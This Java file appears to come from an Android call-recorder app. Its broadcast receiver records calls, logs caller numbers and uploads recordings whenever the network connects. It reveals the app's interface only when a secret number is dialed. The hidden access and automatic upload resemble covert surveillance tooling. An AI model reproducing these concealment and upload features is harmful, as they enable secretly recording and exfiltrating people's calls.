package phonerecorder.kivsw.com.faithphonerecorder.os;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import javax.inject.Inject;

import phonerecorder.kivsw.com.faithphonerecorder.model.persistent_data.IPersistentData;
import phonerecorder.kivsw.com.faithphonerecorder.model.settings.ISettings;
import phonerecorder.kivsw.com.faithphonerecorder.model.utils.MyConfiguration;
import phonerecorder.kivsw.com.faithphonerecorder.model.task_executor.TaskExecutor;
import phonerecorder.kivsw.com.faithphonerecorder.ui.MainActivity;

/**
 * Created by ivan on 4/23/18.
 */

public class Receiver extends android.content.BroadcastReceiver{

    @Inject
    ISettings settings;

    @Inject
    IPersistentData persistentData;

    @Inject
    TaskExecutor taskExecutor;

    @Override
    public void onReceive(Context context, Intent intent) {
        MyConfiguration.waitForDebugger();  // for debugging process
        MyApplication.getComponent().inject(this);

        persistentData.journalAdd(intent);
        try {
            processIntent(context, intent);
        }catch(Throwable t)
        {
            persistentData.journalAdd(t);
        }
    };

    protected void processIntent(Context context, Intent intent)
    {
        String action = intent.getAction();
        switch (action) {
            case Intent.ACTION_NEW_OUTGOING_CALL:
                outgoingCall(context, intent);
                break;
            case Intent.ACTION_BOOT_COMPLETED:
                setLauncherIcon(context, intent);
                break;
            case ConnectivityManager.CONNECTIVITY_ACTION:
                doDataSave(context, intent);
                break;
            case TelephonyManager.ACTION_PHONE_STATE_CHANGED:
                phoneStateChanged(context, intent);
                break;
        }
    }

    protected void doDataSave(Context context, Intent intent)
    {
        taskExecutor.startFileSending();
    };
    protected void setLauncherIcon(Context context, Intent intent)
    {

    }
    protected void phoneStateChanged(Context context, Intent intent)
    {
        if (!settings.getEnableCallRecording())
            return;

        TelephonyManager tm=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        switch (tm.getCallState())
        {
            case TelephonyManager.CALL_STATE_IDLE: // the end of the current conversation
                stopRecording(context);
                break;

            case TelephonyManager.CALL_STATE_OFFHOOK: // the begin of the current conversation
                startRecording(context);
                break;

            case TelephonyManager.CALL_STATE_RINGING: // saves the income phone number
                String phoneNumber=intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER );
                persistentData.setCallInfo(phoneNumber, true);
                break;
        };


    }
    protected void outgoingCall(Context context, Intent intent)
    {
        String phoneNumber=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if(phoneNumber==null)
            phoneNumber="";

        String secretNumber = settings.getSecretNumber();
        if (PhoneNumberUtils.compare(phoneNumber, secretNumber)) {  // shows the UI
            //android.os.SystemClock.sleep(3000); // wait 1 sec, in order to hide secret code
            MainActivity.showActivity(context);
            setResultData(null);
            return;
        }

        if (settings.getEnableCallRecording()) {
            // saves the outgoing phone number
            persistentData.setCallInfo(phoneNumber, false);

        }

    }

    protected void startRecording(Context context)
    {
        IPersistentData.CallInfo callInfo = persistentData.getCallInfo();
        Toast.makeText(context, callInfo.toString(), Toast.LENGTH_LONG)
                .show();
        taskExecutor.startCallRecording();
    };
    protected void stopRecording(Context context)
    {
        IPersistentData.CallInfo callInfo = persistentData.getCallInfo();
        Toast.makeText(context, callInfo.toString(), Toast.LENGTH_LONG)
                .show();
        taskExecutor.stopCallRecording();
    };
}
